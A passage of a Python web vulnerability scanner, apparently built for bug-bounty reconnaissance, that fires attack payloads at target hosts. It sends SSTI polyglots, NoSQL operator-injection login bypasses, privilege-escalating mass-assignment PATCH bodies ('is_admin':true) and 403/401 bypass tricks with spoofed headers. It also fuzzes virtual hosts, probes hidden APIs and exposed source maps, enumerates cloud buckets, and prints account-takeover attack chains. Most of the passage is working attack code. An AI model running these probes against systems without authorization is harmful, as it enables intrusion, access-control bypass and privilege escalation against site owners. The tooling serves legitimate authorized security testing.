                resp2 = urllib.request.urlopen(req2, timeout=8).read().decode()
                if "data" in resp2 and "errors" not in resp2:
                    finding("GraphQL Mutation Without Authentication", "high", f"{host}{path}",
                            "GraphQL mutation accessible without auth token",
                            evidence=resp2[:200], cwe="CWE-862", cvss=8.1)
                    count += 1
            except Exception:
                pass
    print(f"  [+] GraphQL: {count} findings", flush=True)


# ── Phase M: SSTI ────────────────────────────────────────────────────────────

def phase_ssti(urls_file):
    """PDF 2.4: SSTI polyglot → per-engine RCE. James Kettle's foundational research."""
    print("\n[Phase M] SSTI (Server-Side Template Injection)...", flush=True)
    gf_out = run(["sh", "-c",
        f"cat {urls_file} | {tool('gf')} ssti 2>/dev/null | head -100"], timeout=30)
    urls = [l.strip() for l in gf_out.splitlines() if l.strip()]
    if not urls:
        # Also check all param URLs
        urls = [l.strip() for l in _read_lines(urls_file) if "=" in l][:100]

    # Polyglot payload — triggers errors in all major engines
    SSTI_POLYGLOT = "${{<%[%'\"}}%\\"
    SSTI_ERRORS = ["jinja2", "template", "freemarker", "velocity", "twig", "smarty",
                   "org.springframework", "undefined variable", "parse error",
                   "nunjucks", "handlebars", "mustache"]
    count = 0
    for url in cap(urls, 50, "SSTI"):
        modified = qsreplace(url, SSTI_POLYGLOT)
        if not modified or modified == url: continue
        content, _, status = get(modified, timeout=5)
        for err in SSTI_ERRORS:
            if err.lower() in content.lower():
                # Confirm with arithmetic payload
                confirm = qsreplace(url, "{{7*7}}")
                if not confirm: continue
                confirm_content, _, _ = get(confirm, timeout=5)
                sev = "critical" if "49" in confirm_content else "high"
                finding("Server-Side Template Injection (SSTI)", sev, url,
                        f"Template engine error triggered. Engine hint: {err}. "
                        f"{'RCE confirmed (7*7=49)' if sev=='critical' else 'Potential SSTI'}",
                        evidence=content[:200], cwe="CWE-94", cvss=9.8 if sev=="critical" else 8.1)
                count += 1; break
    print(f"  [+] SSTI: {count} findings", flush=True)


# ── Phase N: Mass Assignment ─────────────────────────────────────────────────

def phase_mass_assignment(live_file, urls_file):
    """PDF 3.3: Add is_admin:true, role:admin to PUT/PATCH API requests."""
    print("\n[Phase N] Mass assignment...", flush=True)
    # Find API endpoints that accept JSON body
    api_urls = cap([l.strip() for l in _read_lines(urls_file)
                if any(x in l for x in ["/api/", "/v1/", "/v2/", "/user", "/profile",
                                          "/account", "/settings"]) and "?" not in l], 20, "mass-assignment endpoint")
    PRIV_FIELDS = [
        '{"is_admin":true}', '{"role":"admin"}', '{"admin":true}',
        '{"isAdmin":true}', '{"verified":true}', '{"privileged":true}',
        '{"is_superuser":true}', '{"subscription":"premium"}',
    ]
    count = 0
    for url in api_urls:
        for payload in PRIV_FIELDS[:3]:
            try:
                import urllib.request
                req = urllib.request.Request(url, data=payload.encode(),
                    headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
                    method="PATCH")
                resp = urllib.request.urlopen(req, timeout=5)
                content = resp.read().decode()
                if resp.status in (200, 201) and any(
                    k in content for k in ["admin","role","privilege","superuser"]):
                    finding("Mass Assignment (Privilege Escalation)", "high", url,
                            f"API accepts privilege-escalation field: {payload}",
                            evidence=content[:200], cwe="CWE-915", cvss=8.8)
                    count += 1
            except Exception:
                pass
    print(f"  [+] Mass assignment: {count} findings", flush=True)


# ── Phase O: VHost Discovery ─────────────────────────────────────────────────

def phase_vhost(live_file, domain):
    """PDF §1.2: ffuf Host header fuzzing — finds apps not in DNS."""
    print("\n[Phase O] VHost discovery...", flush=True)
    ffuf = tool("ffuf")
    if not os.path.isfile(ffuf): print("  [-] ffuf not installed", flush=True); return

    # Prefer the dedicated 5k wordlist; fall back to top-110k (truncated for
    # ffuf speed) so the phase doesn't silently no-op when 5k isn't installed.
    WL_DIR = os.path.expanduser("~/.recon-tools/wordlists")
    wordlist = os.path.join(WL_DIR, "subdomains-top5k.txt")
    if not os.path.isfile(wordlist):
        fallback = os.path.join(WL_DIR, "subdomains-top110k.txt")
        if not os.path.isfile(fallback):
            print("  [-] No vhost wordlist found "
                  "(~/.recon-tools/wordlists/subdomains-top5k.txt or top110k.txt)", flush=True)
            return
        # Truncate the larger list to 5k for per-host fuzzing speed.
        wordlist = os.path.join(WL_DIR, "subdomains-top5k.txt")
        try:
            with open(fallback) as src, open(wordlist, "w") as dst:
                for i, line in enumerate(src):
                    if i >= 5000: break
                    dst.write(line)
        except OSError as e:
            print(f"  [-] vhost wordlist setup failed: {e}", flush=True); return

    hosts = cap([l.strip() for l in _read_lines(live_file)
             if l.strip() and l.startswith("http")], 5, "VHost target")
    count = 0
    import tempfile
    for host in hosts:
        # NamedTemporaryFile over mktemp — mktemp is race-prone (symlink attacks).
        # ffuf -o overwrites the file with its own content, so we just need a
        # safe unique path and to clean it up afterwards.
        fd, out_file = tempfile.mkstemp(suffix=".json")
        os.close(fd)
        try:
            run([ffuf, "-u", host + "/", "-H", f"Host: FUZZ.{domain}",
                 "-w", wordlist, "-mc", "200,301,302,403",
                 "-fs", "0", "-t", "50", "-timeout", "5",
                 "-o", out_file, "-of", "json", "-s"], timeout=60)
            if os.path.isfile(out_file):
                try:
                    with open(out_file) as _f: data = json.load(_f)
                    for result in data.get("results", []):
                        vhost = result.get("input", {}).get("FUZZ", "")
                        if vhost:
                            finding("VHost Discovered (Not in DNS)", "medium",
                                    f"{vhost}.{domain}",
                                    f"Virtual host responds differently — not in public DNS",
                                    evidence=f"HTTP {result.get('status',0)}", cwe="CWE-200", cvss=5.3)
                            count += 1
                except Exception:
                    pass
        finally:
            try: os.unlink(out_file)
            except OSError: pass
    print(f"  [+] VHost: {count} discoveries", flush=True)


# ── Phase P: Shadow API Detection ────────────────────────────────────────────

def phase_shadow_apis(live_file):
    """PDF 3.1 API9: Old v1 endpoints still live after v2 ships. Easy wins."""
    print("\n[Phase P] Shadow API detection (v1/legacy endpoints)...", flush=True)
    hosts = cap([l.strip() for l in _read_lines(live_file)
             if l.strip() and l.startswith("http")], 100, "shadow-API host")
    SHADOW_PATHS = [
        "/api/v1/users", "/api/v1/admin", "/api/v1/auth",
        "/v1/users", "/v1/admin", "/v1/secret",
        "/api/v1/config", "/api/v1/debug", "/api/v1/internal",
        "/api/beta/", "/api/test/", "/api/dev/",
        "/api/v2/internal", "/internal/api/",
        "/api/v1/export", "/api/v1/dump",
    ]
    count = 0
    from concurrent.futures import ThreadPoolExecutor

    def check(args):
        host, path = args
        content, headers, status = get(f"{host}{path}", timeout=4)
        if status in (200, 401, 403) and content:
            ct = headers.get("content-type","") or headers.get("Content-Type","")
            if "json" in ct or "application" in ct:
                sev = "high" if status == 200 else "medium"
                return (f"{host}{path}", status, sev, content[:100])
        return None

    with ThreadPoolExecutor(max_workers=30) as pool:
        tasks = [(h, p) for h in hosts for p in SHADOW_PATHS]
        for result in pool.map(check, tasks):
            if result:
                url, status, sev, snippet = result
                finding(f"Shadow/Legacy API Endpoint ({status})", sev, url,
                        f"API endpoint responds with HTTP {status} — may be undocumented/unsecured",
                        evidence=snippet, cwe="CWE-285", cvss=7.5 if sev=="high" else 5.3)
                count += 1
    print(f"  [+] Shadow APIs: {count} findings", flush=True)


# ── Phase Q: NoSQL Injection ─────────────────────────────────────────────────

def phase_nosql(urls_file):
    """PDF 2.1: MongoDB auth bypass via operator injection."""
    print("\n[Phase Q] NoSQL injection...", flush=True)
    # Target login/auth endpoints
    auth_urls = [l.strip() for l in _read_lines(urls_file)
                 if any(x in l.lower() for x in ["login","auth","signin","user"])][:30]
    NOSQL_PAYLOADS = ['{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}']
    NOSQL_ERRORS = ["castError", "badrequest", "unexpected token", "syntaxerror",
                    "cannot read property", "objectid failed"]
    count = 0
    for url in cap(auth_urls, 20, "NoSQL"):
        for payload in NOSQL_PAYLOADS[:2]:
            modified = qsreplace(url, payload)
            if not modified or modified == url: continue
            content, _, status = get(modified, timeout=5)
            # Bypass: different response size/content than normal
            if any(e in content.lower() for e in NOSQL_ERRORS):
                finding("NoSQL Injection", "critical", url,
                        f"MongoDB operator injection error triggered: {payload}",
                        evidence=content[:200], cwe="CWE-943", cvss=9.8)
                count += 1
            elif status in (200, 302) and payload in url:
                # Size-based detection
                normal, _, _ = get(url, timeout=5)
                if abs(len(content) - len(normal)) > 50:
                    finding("Potential NoSQL Injection (Response Diff)", "high", url,
                            f"Response changed with NoSQL operator payload",
                            evidence=f"Normal: {len(normal)}b, Injected: {len(content)}b",
                            cwe="CWE-943", cvss=8.1)
                    count += 1
    print(f"  [+] NoSQL: {count} findings", flush=True)


# ── Phase R: JSLuice (AST-based JS analysis) ─────────────────────────────────

def phase_jsluice(urls_file):
    """BishopFox JSLuice — AST parser for JS bundles. Surfaces endpoints,
    secret candidates, and inline URLs that regex misses inside webpack /
    minified payloads. We use it to:
      1. extract new endpoints (added as info findings for manual review)
      2. flag inline secret candidates that didn't make it into TruffleHog
         (e.g. unverifiable custom-format tokens worth a manual look)
    """
    import shutil, tempfile, hashlib
    print("\n[Phase R] JSLuice — AST-based JS analysis...", flush=True)

    jsl = tool("jsluice")
    if not (os.path.isfile(jsl) or shutil.which("jsluice")):
        print("  [-] jsluice not installed — skipping Phase R", flush=True)
        return

    js_urls = cap([l.strip() for l in _read_lines(urls_file)
                   if l.strip() and ".js" in l and "?" not in l], 100, "JS file")
    if not js_urls:
        print("  [-] No JS files to analyze", flush=True); return

    js_dir = tempfile.mkdtemp(prefix="br_jsl_")
    url_map = {}
    try:
        def fetch(url):
            content, _, status = get(url, timeout=8)
            if status == 200 and content:
                fn = hashlib.md5(url.encode()).hexdigest() + ".js"
                path = os.path.join(js_dir, fn)
                try:
                    with open(path, "w", encoding="utf-8", errors="replace") as fh:
                        fh.write(content)
                    return (url, path)
                except OSError:
                    return None
            return None

        with ThreadPoolExecutor(max_workers=20) as pool:
            fetched = [r for r in pool.map(fetch, js_urls) if r]
        for url, path in fetched:
            url_map[path] = url

        # jsluice urls <file> → one JSON per line {url, method, queryParams, headers, ...}
        # jsluice secrets <file> → one JSON per line {kind, data, severity, filename}
        endpoints, secrets = 0, 0
        for url, path in fetched:
            urls_out = run([jsl, "urls", path], timeout=30)
            for line in urls_out.splitlines():
                try:
                    ev = json.loads(line)
                except json.JSONDecodeError:
                    continue
                u = ev.get("url", "")
                if u.startswith(("/api/", "/v1/", "/v2/", "/admin", "/internal")):
                    # Surface as info — these feed manual review and the
                    # shadow-API phase already screens common shapes.
                    finding("JS-leaked Endpoint (AST-extracted)", "info", url,
                            f"Endpoint discovered inside JS bundle: {u} "
                            f"(method: {ev.get('method','GET')})",
                            evidence=u, cwe="CWE-200", cvss=2.0)
                    endpoints += 1

            sec_out = run([jsl, "secrets", path], timeout=30)
            for line in sec_out.splitlines():
                try:
                    ev = json.loads(line)
                except json.JSONDecodeError:
                    continue
                kind = ev.get("kind", "secret")
                sev = ev.get("severity", "medium").lower()
                if sev not in ("critical", "high", "medium", "low"):
                    sev = "medium"
                # jsluice returns unverifiable candidates — TruffleHog already
                # ran with --only-verified, so anything new here is "review by
                # hand" material, capped at medium severity to avoid noise.
                if sev in ("critical", "high"): sev = "medium"
                finding(f"JS Secret Candidate (unverified): {kind}", sev, url,
                        f"jsluice flagged a {kind} pattern — verify manually before reporting.",
                        evidence=json.dumps(ev.get("data", ""))[:200],
                        cwe="CWE-798", cvss=5.3)
                secrets += 1
        print(f"  [+] JSLuice: {endpoints} endpoints, {secrets} secret candidates "
              f"from {len(fetched)} JS files", flush=True)
    finally:
        shutil.rmtree(js_dir, ignore_errors=True)


# ── Phase S: Kiterunner (API shadow-route discovery) ─────────────────────────

def phase_kiterunner(live_file):
    """Assetnote kiterunner — API content discovery using 800k+ Swagger-scraped
    routes (`routes-large.kite`). Materially better than dir-busting for REST
    endpoints because it sends correct methods + content-types per route.
    """
    import shutil
    print("\n[Phase S] Kiterunner — API shadow-route discovery...", flush=True)
    kr = tool("kr")
    if not (os.path.isfile(kr) or shutil.which("kr") or shutil.which("kiterunner")):
        print("  [-] kr/kiterunner not installed — skipping Phase S", flush=True)
        return

    # Resolve wordlist. Order: $RECON_KITE → Assetnote default download path
    kite_paths = [
        os.environ.get("RECON_KITE", ""),
        os.path.expanduser("~/.recon-tools/wordlists/routes-large.kite"),
        os.path.expanduser("~/.recon-tools/wordlists/routes-small.kite"),
    ]
    kite = next((p for p in kite_paths if p and os.path.isfile(p)), "")
    if not kite:
        # Auto-fetch the small (~10MB) variant — full one is 600MB, opt-in.
        wl_dir = os.path.expanduser("~/.recon-tools/wordlists")
        os.makedirs(wl_dir, exist_ok=True)
        target = os.path.join(wl_dir, "routes-small.kite")
        print(f"  [*] Downloading routes-small.kite (Assetnote)…", flush=True)
        rc = run(["curl", "-sSL", "-o", target,
                  "https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite"],
                 timeout=120)
        if os.path.isfile(target) and os.path.getsize(target) > 1024:
            kite = target
        else:
            print("  [-] No kite wordlist available — skipping Phase S", flush=True)
            return

    hosts = cap([l.strip() for l in _read_lines(live_file)
                 if l.strip() and l.startswith("http")], 20, "kiterunner host")
    if not hosts:
        print("  [-] No live hosts", flush=True); return

    import tempfile
    tmp_f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    try:
        tmp_f.write("\n".join(hosts)); tmp_f.close()
        out = run([kr, "scan", tmp_f.name, "-w", kite,
                   "-x", "5", "-j", "20", "-o", "json", "--fail-status-codes", "404,400",
                   "--quiet"], timeout=600)
    finally:
        try: os.unlink(tmp_f.name)
        except OSError: pass

    count = 0
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{"): continue
        try:
            ev = json.loads(line)
        except json.JSONDecodeError: continue
        target_url = ev.get("url", "") or ev.get("target", "")
        status = ev.get("status", 0) or ev.get("status_code", 0)
        if status in (200, 201, 204, 301, 302, 401, 403):
            sev = "high" if status == 200 else "medium"
            finding(f"Shadow API Route ({status})", sev, target_url,
                    f"kiterunner hit on undocumented API route — HTTP {status}",
                    evidence=line[:200], cwe="CWE-285",
                    cvss=7.5 if sev == "high" else 5.3)
            count += 1
    print(f"  [+] Kiterunner: {count} new API routes", flush=True)


# ── Phase T: CRLF Injection ──────────────────────────────────────────────────

def phase_crlfuzz(urls_file):
    """crlfuzz — fast CRLF injection probe. CRLF → header injection → XSS,
    cache poisoning, response splitting. Still surfaces frequently in CDN
    edge configs.
    """
    import shutil
    print("\n[Phase T] CRLF injection (crlfuzz)...", flush=True)
    crf = tool("crlfuzz")
    if not (os.path.isfile(crf) or shutil.which("crlfuzz")):
        print("  [-] crlfuzz not installed — skipping Phase T", flush=True)
        return

    urls = cap([l.strip() for l in _read_lines(urls_file)
                if l.strip() and "?" in l], 300, "crlfuzz URL")
    if not urls:
        print("  [-] No parameterized URLs to test", flush=True); return

    import tempfile
    tmp_f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    try:
        tmp_f.write("\n".join(urls)); tmp_f.close()
        out = run([crf, "-l", tmp_f.name, "-c", "20", "-s"], timeout=180)
    finally:
        try: os.unlink(tmp_f.name)
        except OSError: pass

    count = 0
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("VULN") or "[CRLF]" in line or "[+]" in line and "crlf" in line.lower():
            finding("CRLF Injection", "high", line[:200],
                    "crlfuzz confirmed CRLF injection — can chain to XSS, header injection, cache poisoning",
                    evidence=line[:300], cwe="CWE-93", cvss=7.4)
            count += 1
    print(f"  [+] CRLF: {count} findings", flush=True)


# ── Phase U: 403/401 Access-Control Bypass ───────────────────────────────────

def phase_bypass_403(live_file):
    """Try common 403/401 bypass techniques (path traversal, header tricks)
    against endpoints that returned 401/403 during recon. High-signal
    because successful bypass often = direct unauthenticated admin access.
    """
    print("\n[Phase U] 403/401 access-control bypass...", flush=True)
    # Re-probe known sensitive paths against each host; if 401/403, try bypass.
    GATED_PATHS = ["/admin", "/admin/", "/api/admin", "/v1/admin",
                   "/actuator", "/internal", "/debug", "/console",
                   "/manager/html", "/wp-admin", "/api/v1/admin/users"]
    BYPASSES = [
        # Path tricks
        ("/{p}/", lambda p: f"/{p}/"),                     # trailing slash
        ("/{p}/.", lambda p: f"/{p}/."),                   # dot suffix
        ("/{p}/..;/", lambda p: f"/{p}/..;/"),             # semicolon traversal (Tomcat)
        ("/{p}%20", lambda p: f"/{p}%20"),                 # encoded space
        ("/{p}%09", lambda p: f"/{p}%09"),                 # encoded tab
        ("/.{p}", lambda p: f"/.{p.lstrip('/')}"),         # dot prefix
        ("//{p}", lambda p: f"//{p}"),                     # double slash
    ]
    BYPASS_HEADERS = [
        {"X-Original-URL": "{p}"},
        {"X-Rewrite-URL": "{p}"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"Referer": "{host}/admin"},
    ]
    hosts = cap([l.strip() for l in _read_lines(live_file)
                 if l.strip() and l.startswith("http")], 30, "bypass host")
    count = 0

    def try_one(host, path):
        out_findings = []
        baseline_url = host.rstrip("/") + path
        _, _, base_status = get(baseline_url, timeout=5)
        if base_status not in (401, 403):
            return out_findings

        # Path-trick bypasses
        for label, build in BYPASSES:
            try:
                trick_path = build(path.lstrip("/"))
                if not trick_path.startswith("/"):
                    trick_path = "/" + trick_path
                trick_url = host.rstrip("/") + trick_path
                content, _, status = get(trick_url, timeout=5)
                if status == 200 and len(content) > 100:
                    out_findings.append((trick_url, status, f"path-trick {label}",
                                         content[:150]))
                    break  # first hit per endpoint is enough
            except Exception:
                continue

        # Header-trick bypasses
        for hdr in BYPASS_HEADERS:
            try:
                resolved = {k: v.replace("{p}", path).replace("{host}", host)
                            for k, v in hdr.items()}
                content, _, status = get(baseline_url, timeout=5, headers=resolved)
                if status == 200 and len(content) > 100:
                    out_findings.append((baseline_url, status, f"header {list(hdr)[0]}",
                                         content[:150]))
                    break
            except Exception:
                continue
        return out_findings

    with ThreadPoolExecutor(max_workers=20) as pool:
        tasks = [(h, p) for h in hosts for p in GATED_PATHS]
        for results in pool.map(lambda args: try_one(*args), tasks):
            for url, status, technique, snippet in results:
                finding(f"403/401 Bypass via {technique}", "critical", url,
                        f"Bypassed access control on a gated endpoint → HTTP {status}. "
                        f"Direct unauthenticated access to a previously-protected resource.",
                        evidence=snippet, cwe="CWE-284", cvss=9.1)
                count += 1
    print(f"  [+] 403 bypass: {count} findings", flush=True)


# ── Phase V: Source-map exposure ─────────────────────────────────────────────

def phase_sourcemap(urls_file):
    """Hunt for leaked .js.map files. When a .map is reachable, the entire
    original (TypeScript/JSX/Vue) source tree can be recovered with sourcemapper
    or any standard tool — total disclosure of internal code, comments, and
    routes.
    """
    import shutil
    print("\n[Phase V] Source-map exposure...", flush=True)
    # Probe .map for every JS URL — cheap, high signal.
    js_urls = cap([l.strip() for l in _read_lines(urls_file)
                   if l.strip() and ".js" in l and "?" not in l], 200, "JS source-map probe")
    if not js_urls:
        print("  [-] No JS files in URL set", flush=True); return

    smapper = tool("sourcemapper")
    has_smapper = os.path.isfile(smapper) or shutil.which("sourcemapper")

    def probe(url):
        candidates = [url + ".map"]
        # Also probe the convention where /path/app.js → /path/app.js.map
        for cand in candidates:
            content, headers, status = get(cand, timeout=5)
            if status == 200 and content and ('"sources":' in content or '"mappings":' in content):
                return cand, len(content)
        return None

    hits = []
    with ThreadPoolExecutor(max_workers=30) as pool:
        for r in pool.map(probe, js_urls):
            if r: hits.append(r)

    for cand, size in hits:
        detail = (f"Source-map file is publicly accessible — the original "
                  f"(pre-bundle) source can be reconstructed.")
        if has_smapper:
            detail += " Run `sourcemapper -url <url> -output <dir>` to confirm."
        finding("Exposed Source Map (Source Disclosure)", "high", cand, detail,
                evidence=f"Size: {size} bytes, valid .map JSON",
                cwe="CWE-540", cvss=7.5)
    print(f"  [+] Source maps: {len(hits)} exposures", flush=True)


# ── Phase W: Cloud SaaS Public-Asset Enumeration ─────────────────────────────

def phase_cloud_enum(org):
    """cloud_enum — multi-cloud public asset hunter. Closes the Azure/GCP gap
    that S3Scanner doesn't cover.
    """
    import shutil
    print(f"\n[Phase W] Cloud public-asset enum for '{org}'...", flush=True)
    if not org:
        print("  [-] No org keyword passed — skipping", flush=True); return

    ce = tool("cloud_enum")
    if not (os.path.isfile(ce) or shutil.which("cloud_enum")):
        print("  [-] cloud_enum not installed — skipping Phase W", flush=True)
        return

    # cloud_enum doesn't have a JSON output mode that's stable across versions,
    # so we parse its grep-friendly stdout.
    safe_org = re.sub(r'[^a-zA-Z0-9 \-_]', '', org).strip().lower().replace(' ', '-')
    if not safe_org:
        return
    out = run([ce, "-k", safe_org, "--quickscan", "--disable-aws"], timeout=300)
    # AWS disabled because S3Scanner already covers it; cloud_enum here is
    # for Azure + GCP coverage. Drop --disable-aws if you want both.

    count = 0
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        # cloud_enum emits lines like:
        #   "OPEN AZURE BLOB: https://acme.blob.core.windows.net"
        #   "OPEN GCP BUCKET: https://storage.googleapis.com/acme"
        m = re.match(r'(?i)(OPEN|FOUND|EXPOSED).{0,40}?(https?://\S+)', line)
        if not m:
            continue
        category = m.group(1).upper()
        url = m.group(2)
        # 'OPEN' (anonymous read) is the bug bounty win.
        sev = "high" if "OPEN" in category else "medium"
        finding(f"Exposed Cloud Storage: {line.split(':')[0][:60]}", sev, url,
                f"Public cloud asset discovered via cloud_enum. {line}",
                evidence=line[:300], cwe="CWE-200",
                cvss=7.5 if sev == "high" else 5.3)
        count += 1
    print(f"  [+] Cloud enum: {count} exposed assets", flush=True)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--live", required=True, help="Live hosts file from httpx")
    parser.add_argument("--urls", required=True, help="Collected URLs file")
    parser.add_argument("--domain", required=True)
    parser.add_argument("--org", default="")
    parser.add_argument("--out", required=True, help="Output JSON findings file")
    parser.add_argument("--collab", default="", help="Collaborator host for SSRF/blind XSS")
    parser.add_argument("--github-repos", default="",
                        help="JSON from github_recon.py — Phase G scans these with trufflehog")
    args = parser.parse_args()

    for label, path in (("--live", args.live), ("--urls", args.urls)):
        if not os.path.isfile(path):
            print(f"[!] {label} file not found: {path}", file=sys.stderr)
            sys.exit(1)

    def _count(path):
        with open(path) as fh:
            return sum(1 for _ in fh if _.strip())

    print(f"\n{'='*60}", flush=True)
    print(f"  bounty-recon vulnerability scan", flush=True)
    print(f"  Target: {args.org or args.domain}", flush=True)
    print(f"  Live hosts: {_count(args.live)}", flush=True)
    print(f"  URLs: {_count(args.urls)}", flush=True)
    print(f"{'='*60}", flush=True)

    def write_findings():
        with open(args.out, "w") as f:
            json.dump({"domain": args.domain, "org": args.org,
                       "scan_time": datetime.utcnow().isoformat(),
                       "total": len(findings), "findings": findings}, f, indent=2)

    # Each phase is isolated: a crash in one (bad input, tool quirk, network edge
    # case) is logged and skipped instead of aborting the whole scan and losing
    # every finding gathered so far. findings.json is written no matter what.
    PHASES = [
        ("nuclei",     phase_nuclei,           (args.live,)),
        ("xss",        phase_xss,              (args.urls, args.collab)),
        ("ssrf",       phase_ssrf,             (args.urls, args.collab)),
        ("cors",       phase_cors,             (args.live,)),
        ("redirect",   phase_open_redirect,    (args.urls,)),
        ("files",      phase_sensitive_files,  (args.live,)),
        ("secrets",    phase_secrets,          (args.urls, args.github_repos)),
        ("sqli",       phase_sqli,             (args.urls,)),
        ("ports",      phase_ports,            (args.live,)),
        ("jwt",        phase_jwt,              (args.live,)),
        ("hostheader", phase_host_header,      (args.live, args.collab)),
        ("graphql",    phase_graphql,          (args.live,)),
        ("ssti",       phase_ssti,             (args.urls,)),
        ("massassign", phase_mass_assignment,  (args.live, args.urls)),
        ("vhost",      phase_vhost,            (args.live, args.domain)),
        ("shadow",     phase_shadow_apis,      (args.live,)),
        ("nosql",      phase_nosql,            (args.urls,)),
        ("jsluice",    phase_jsluice,          (args.urls,)),
        ("kiterunner", phase_kiterunner,       (args.live,)),
        ("crlfuzz",    phase_crlfuzz,          (args.urls,)),
        ("bypass403",  phase_bypass_403,       (args.live,)),
        ("sourcemap",  phase_sourcemap,        (args.urls,)),
        ("cloudenum",  phase_cloud_enum,       (args.org,)),
    ]
    try:
        for name, fn, fn_args in PHASES:
            try:
                fn(*fn_args)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"  [!] phase '{name}' errored ({type(e).__name__}: {e}) — skipping",
                      flush=True)
            write_findings()  # checkpoint after every phase
    except KeyboardInterrupt:
        print("\n[!] Interrupted — writing findings collected so far…", flush=True)

    write_findings()

    # Summary
    by_sev = {}
    for f_ in findings:
        by_sev[f_["severity"]] = by_sev.get(f_["severity"], 0) + 1

    print(f"\n{'='*60}")
    print(f"  SCAN COMPLETE — {len(findings)} total findings")
    for sev in ["critical","high","medium","low","info"]:
        if by_sev.get(sev,0):
            print(f"  {sev.upper():10}: {by_sev[sev]}")
    print(f"  Output: {args.out}")
    print(f"{'='*60}")

    # ── Chaining analysis (PDF §8.4) — high-value attack chains ──────────────
    titles = [f["title"].lower() for f in findings]
    chains = []
    if any("xss" in t for t in titles) and any("redirect" in t for t in titles):
        chains.append("🔴 XSS + Open Redirect → CSRF token steal → Account Takeover")
    if any("ssrf" in t for t in titles):
        chains.append("🔴 SSRF → Cloud Metadata (IMDSv1) → IAM keys → Full AWS takeover")
    if any("takeover" in t or "cname" in t for t in titles) and any("xss" in t for t in titles):
        chains.append("🔴 Subdomain Takeover + cookie scoped to .target.com → Session theft")
    if any("graphql" in t for t in titles) and any("idor" in t or "auth" in t for t in titles):
        chains.append("🟠 GraphQL introspection → hidden mutation → Privilege escalation")
    if any("jwt" in t for t in titles) and any("mass" in t for t in titles):
        chains.append("🟠 JWT alg:none + Mass assignment → Admin account creation")
    if any("host header" in t for t in titles):
        chains.append("🟠 Host Header Injection → Password reset link poisoning → ATO")
    if chains:
        print(f"\n  ⛓️  HIGH-VALUE CHAINS DETECTED:")
        for c in chains:
            print(f"  {c}")
        print()

if __name__ == "__main__":
    main()
